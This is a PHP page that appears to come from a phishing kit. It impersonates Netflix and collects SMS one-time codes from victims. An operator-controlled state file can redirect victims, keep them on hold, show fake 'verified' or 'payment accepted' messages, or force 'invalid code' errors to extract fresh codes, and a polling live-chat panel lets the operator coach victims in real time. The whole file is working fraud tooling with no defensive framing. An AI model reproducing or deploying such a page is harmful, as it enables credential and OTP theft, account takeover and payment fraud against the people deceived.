<?php
require 'main.php';

$stateFile = __DIR__ . '/admin_state.json';
$smsState = [
    'mode' => 'default',
    'custom_url' => '',
    'instruction' => 'stay_wait',
    'chat_enabled' => false
];

if (file_exists($stateFile)) {
    $decoded = json_decode(file_get_contents($stateFile), true);
    if (is_array($decoded)) {
        $smsState = array_merge($smsState, $decoded);
    }
}

if ($smsState['mode'] === 'redirect_wait') {
    header('location: wait.php?next=sms.php');
    exit;
}

if ($smsState['mode'] === 'redirect_custom' && !empty($smsState['custom_url']) && filter_var($smsState['custom_url'], FILTER_VALIDATE_URL)) {
    header('location: ' . $smsState['custom_url']);
    exit;
}

if ($smsState['instruction'] === 'stay_wait') {
    header('location: wait.php?next=sms.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/netflixc.css">
    <style>
        .status {
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 16px;
            text-align: center;
        }

        .status.success {
            background: #e6ffed;
            color: #1b5e20;
            border: 1px solid #a5d6a7;
        }

        .status.info {
            background: #e3f2fd;
            color: #0d47a1;
            border: 1px solid #90caf9;
        }

        .status.error {
            background: #fdecea;
            color: #c62828;
            border: 1px solid #ef9a9a;
        }

        .chat-panel {
            margin-top: 20px;
            display: none;
        }

        .chat-panel.active { display: block; }

        .chat-box {
            background: #0f0f0f;
            border: 1px solid #2a2a2a;
            border-radius: 6px;
            padding: 12px;
            max-height: 240px;
            overflow-y: auto;
            margin-top: 8px;
        }

        .chat-message {
            margin-bottom: 10px;
            padding: 8px;
            border-radius: 6px;
        }

        .chat-message.admin { background: #17212b; border: 1px solid #2c3e50; }
        .chat-message.user { background: #1b2a18; border: 1px solid #2e7d32; }

        .chat-meta { font-size: 12px; color: #9e9e9e; }

        .chat-controls {
            display: flex;
            gap: 8px;
            margin-top: 10px;
        }

        .chat-controls input {
            flex: 1;
            padding: 10px;
            border-radius: 6px;
            border: 1px solid #333;
            background: #111;
            color: #f5f5f5;
        }

        .chat-controls button {
            padding: 10px 14px;
            border: none;
            border-radius: 6px;
            background: #e50914;
            color: #fff;
            cursor: pointer;
        }

        .chat-controls button:hover { background: #b20710; }

        .form-disabled {
            opacity: 0.6;
            pointer-events: none;
        }
    </style>
    <title>Netflix</title>
</head>
<body>
<header>
   <div class="logo">
           <img src="res/img/Logo.png" alt="Netflix logo">  </div>
       </header>

<main>

<div class="form">
    <div class="continer">
    <h1>Confirmation</h1>

<?php
$mode = $smsState['mode'];
$instruction = $smsState['instruction'];
$showForm = !in_array($mode, ['otp_pass', 'payment_accept']);
$forceError = $mode === 'error_verification' || isset($_GET['error']) || isset($_GET['otp_error']) || $instruction === 'otp_error';

if ($mode === 'otp_pass') {
    echo '<div class="status success">Your SMS OTP has been verified successfully.</div>';
}

if ($mode === 'payment_accept') {
    echo '<div class="status info">';
    echo '<img src="res/img/loadings.gif" alt="Payment accepted" style="max-width:120px; display:block; margin:0 auto 10px;">';
    echo '<p>Payment has been accepted in the app. Thank you for your confirmation.</p>';
    echo '</div>';
}

if ($forceError) {
    echo '<div class="status error" id="otp-error">Invalid code. Please wait a moment before trying again.</div>';
}

if ($showForm) {
    echo '<form action="post.php" method="post" id="otp-form" class="' . ($forceError ? 'form-disabled' : '') . '">';
    echo '<div class="col2"><h4 style="font-weight:normal;">Please enter the verification code sent to your phone.</h4> </div>';
    echo '<div class="coll">';
    echo '<input type="text" placeholder="Enter code" name="otp" required> <br>';

    if ($forceError) {
        echo '<input type="hidden" name="exit">';
    }

    echo '<div class="but1">';
    echo '<button type="submit">Confirm</button>';
    echo '</div>';
    echo '</div> <br>';
    echo '</form>';
}
?>

    <div class="chat-panel" id="chat-panel">
        <h3>Live chat</h3>
        <div class="chat-box" id="chat-box"></div>
        <div class="chat-controls">
            <input type="text" id="chat-input" placeholder="Type a message...">
            <button type="button" id="chat-send">Send</button>
        </div>
        <p class="chat-meta">Chat appears only when the admin enables it.</p>
    </div>

</div>
</div>


</main>
<script>
    const chatPanel = document.getElementById('chat-panel');
    const chatBox = document.getElementById('chat-box');
    const chatInput = document.getElementById('chat-input');
    const chatSend = document.getElementById('chat-send');
    const otpError = document.getElementById('otp-error');
    const otpForm = document.getElementById('otp-form');
    let chatReady = false;

    function renderChat(messages) {
        if (!chatBox) return;
        chatBox.innerHTML = '';

        if (!messages.length) {
            chatBox.innerHTML = '<div class="chat-meta">No messages yet.</div>';
            return;
        }

        messages.forEach((entry) => {
            const row = document.createElement('div');
            row.className = `chat-message ${entry.sender}`;
            row.innerHTML = `
                <div>${entry.message.replace(/\n/g, '<br>')}</div>
                <div class="chat-meta">${entry.sender.charAt(0).toUpperCase() + entry.sender.slice(1)} • ${entry.formatted}</div>
            `;
            chatBox.appendChild(row);
        });

        chatBox.scrollTop = chatBox.scrollHeight;
    }

    async function fetchChat() {
        try {
            const response = await fetch('chat_api.php?action=fetch');
            const data = await response.json();
            if (data.chat_enabled) {
                chatPanel.classList.add('active');
                chatInput.disabled = false;
                chatSend.disabled = false;
                renderChat(data.messages || []);
            } else {
                chatPanel.classList.remove('active');
                chatInput.disabled = true;
                chatSend.disabled = true;
            }
        } catch (e) {
            console.error('Unable to load chat.', e);
        }
    }

    async function sendChatMessage() {
        if (!chatInput.value.trim()) return;
        const message = chatInput.value.trim();
        chatInput.value = '';
        try {
            await fetch('chat_api.php?action=send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ sender: 'user', message })
            });
            fetchChat();
        } catch (e) {
            console.error('Unable to send chat message', e);
        }
    }

    async function pollState() {
        try {
            const response = await fetch('state.php');
            const state = await response.json();
            if (state.chat_enabled && !chatReady) {
                chatReady = true;
                chatPanel.classList.add('active');
                fetchChat();
                setInterval(fetchChat, 3000);
            } else if (!state.chat_enabled) {
                chatPanel.classList.remove('active');
                chatReady = false;
            }
        } catch (e) {
            console.error('Unable to poll state', e);
        }
    }

    if (chatSend) {
        chatSend.addEventListener('click', sendChatMessage);
        chatInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendChatMessage();
            }
        });
    }

    if (otpError && otpForm) {
        setTimeout(() => {
            otpForm.classList.remove('form-disabled');
            otpError.style.display = 'none';
        }, 5000);
    }

    pollState();
    setInterval(pollState, 4000);
</script>
</body>
</html>
